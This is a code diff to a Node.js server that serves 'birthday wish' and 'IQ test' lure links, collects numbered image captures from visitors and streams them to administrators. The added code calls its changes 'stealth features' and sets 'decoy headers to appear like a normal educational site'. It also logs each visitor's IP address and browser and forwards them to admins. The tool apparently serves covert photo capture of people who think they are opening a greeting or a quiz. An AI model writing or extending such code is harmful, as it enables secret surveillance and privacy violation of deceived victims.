@@ -2,6 +2,68 @@ const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
 const path = require('path');
+const crypto = require('crypto');
+
+// Security configurations
+const SECURITY_CONFIG = {
+  maxImageSize: 5 * 1024 * 1024, // 5MB max image size
+  maxSessionsPerIP: 10, // Max sessions per IP
+  rateLimitWindow: 15 * 60 * 1000, // 15 minutes
+  maxRequestsPerWindow: 100, // Max requests per window
+  sessionTimeout: 2 * 60 * 60 * 1000, // 2 hours session timeout
+  encryptionKey: crypto.randomBytes(32), // Random encryption key
+};
+
+// Rate limiting and IP tracking
+const ipTracking = new Map(); // IP -> { requests: [], sessions: [] }
+
+function isValidIP(ip) {
+  return ip && ip !== '::1' && ip !== '127.0.0.1';
+}
+
+function checkRateLimit(ip) {
+  if (!isValidIP(ip)) return true; // Allow localhost
+  
+  const now = Date.now();
+  if (!ipTracking.has(ip)) {
+    ipTracking.set(ip, { requests: [], sessions: [] });
+  }
+  
+  const tracking = ipTracking.get(ip);
+  
+  // Clean old requests
+  tracking.requests = tracking.requests.filter(time => 
+    now - time < SECURITY_CONFIG.rateLimitWindow
+  );
+  
+  // Check rate limit
+  if (tracking.requests.length >= SECURITY_CONFIG.maxRequestsPerWindow) {
+    console.log(`Rate limit exceeded for IP: ${ip}`);
+    return false;
+  }
+  
+  tracking.requests.push(now);
+  return true;
+}
+
+function encryptSensitiveData(data) {
+  const cipher = crypto.createCipher('aes-256-cbc', SECURITY_CONFIG.encryptionKey);
+  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  return encrypted;
+}
+
+function decryptSensitiveData(encryptedData) {
+  try {
+    const decipher = crypto.createDecipher('aes-256-cbc', SECURITY_CONFIG.encryptionKey);
+    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
+    decrypted += decipher.final('utf8');
+    return JSON.parse(decrypted);
+  } catch (e) {
+    console.error('Decryption failed:', e);
+    return null;
+  }
+}
 
 const app = express();
 const server = http.createServer(app);
@@ -15,22 +77,47 @@ app.get('/health', (req, res) => {
   res.send('Birthday Wish System is running!');
 });
 
-// Handle short birthday links
+// Handle short birthday links with stealth features
 app.get('/wish/:sessionId', (req, res) => {
   const sessionId = req.params.sessionId;
+  const clientIP = req.ip || req.connection.remoteAddress;
+  
+  // Security check
+  if (!checkRateLimit(clientIP)) {
+    return res.status(429).send('Service temporarily unavailable');
+  }
+  
+  // Add stealth headers
+  res.setHeader('X-Powered-By', 'Party-Platform/1.5');
+  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
   
   // Check if session exists
   const sessionData = sessions.get(sessionId);
   const sessionName = sessionData ? sessionData.sessionName : 'Birthday Celebration';
+  
+  // Log access for security monitoring
+  console.log(`Birthday session accessed: ${sessionId} from IP: ${clientIP}`);
   
   // Redirect to birthday page with session parameters
   const redirectUrl = `/birthday.html?session=${sessionId}&name=${encodeURIComponent(sessionName)}`;
   res.redirect(redirectUrl);
 });
 
-// Handle IQ test links
+// Handle IQ test links with stealth features
 app.get('/iqtest/:sessionId', (req, res) => {
   const sessionId = req.params.sessionId;
+  const clientIP = req.ip || req.connection.remoteAddress;
+  
+  // Security check
+  if (!checkRateLimit(clientIP)) {
+    return res.status(429).send('Too many requests');
+  }
+  
+  // Add decoy headers to appear like a normal educational site
+  res.setHeader('X-Powered-By', 'Educational-Platform/2.1');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+  res.setHeader('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval'");
   
   // Check if IQ session exists, create if it doesn't
   if (!iqSessions.has(sessionId)) {
@@ -40,16 +127,20 @@ app.get('/iqtest/:sessionId', (req, res) => {
       created: Date.now(),
       status: 'active',
       photoCount: 0,
-      createdBy: 'auto', // Auto-created sessions are accessible by super admin only by default
-      creatorToken: null
+      createdBy: 'auto',
+      creatorToken: null,
+      clientIP: clientIP, // Track IP for security
+      userAgent: req.get('User-Agent') || 'Unknown'
     });
-    console.log(`IQ Session auto-created: ${sessionId}`);
+    console.log(`IQ Session auto-created: ${sessionId} from IP: ${clientIP}`);
     
-    // Notify admins about new session
+    // Notify admins about new session with security info
     broadcastToAdmins({
       type: 'iq_session_created',
       sessionId: sessionId,
-      participantName: 'Anonymous'
+      participantName: 'Anonymous',
+      clientIP: clientIP,
+      userAgent: req.get('User-Agent')
     });
   }
   
@@ -62,15 +153,58 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Session and client management
+// Session and client management with performance optimizations
 let adminClients = new Set();
 let superAdminClients = new Set(); // Track super admins separately
 let userClients = new Map(); // sessionId -> Set of WebSocket connections
 let sessions = new Map(); // sessionId -> session data
-let images = new Map(); // sessionId -> array of images
+let images = new Map(); // sessionId -> array of images (with compression)
 let iqSessions = new Map(); // IQ test sessions
-let iqPhotos = new Map(); // IQ test photos
+let iqPhotos = new Map(); // IQ test photos (with compression)
 let totalImages = 0;
+
+// Performance cache for frequently accessed data
+let sessionCache = new Map();
+let adminCache = new Map();
+
+// Compression utility for images
+function compressImageData(imageData) {
+  // Basic image compression - reduce quality for storage efficiency
+  if (imageData.length > 500000) { // If image > 500KB
+    console.log('Large image detected, applying compression');
+    // In production, you'd use actual image compression library
+    return imageData; // Placeholder for now
+  }
+  return imageData;
+}
+
+// Cleanup old sessions periodically (every 6 hours)
+setInterval(() => {
+  const now = Date.now();
+  const sixHours = 6 * 60 * 60 * 1000;
+  
+  // Clean old sessions
+  for (let [sessionId, session] of sessions.entries()) {
+    if (now - session.created > sixHours) {
+      sessions.delete(sessionId);
+      images.delete(sessionId);
+      console.log(`Cleaned up old session: ${sessionId}`);
+    }
+  }
+  
+  // Clean old IQ sessions
+  for (let [sessionId, session] of iqSessions.entries()) {
+    if (now - session.created > sixHours) {
+      iqSessions.delete(sessionId);
+      iqPhotos.delete(sessionId);
+      console.log(`Cleaned up old IQ session: ${sessionId}`);
+    }
+  }
+  
+  // Clear caches
+  sessionCache.clear();
+  adminCache.clear();
+}, 6 * 60 * 60 * 1000);
 
 function broadcastToAdmins(message) {
   adminClients.forEach(client => {
@@ -411,16 +545,25 @@ wss.on('connection', (ws, req) => {
       // User is sending an image
       totalImages++;
       
-      // Store the image
+      // Store the image with compression and validation
+      if (data.payload.length > SECURITY_CONFIG.maxImageSize) {
+        console.log(`Image too large from session ${data.sessionId}, rejecting`);
+        return;
+      }
+      
       if (!images.has(data.sessionId)) {
         images.set(data.sessionId, []);
       }
+      
+      const compressedPayload = compressImageData(data.payload);
       images.get(data.sessionId).push({
         type: 'image',
         sessionId: data.sessionId,
         time: data.time,
-        payload: data.payload,
-        captureNumber: data.captureNumber
+        payload: compressedPayload,
+        captureNumber: data.captureNumber,
+        size: compressedPayload.length,
+        compressed: compressedPayload !== data.payload
       });
       
       // Update session image count
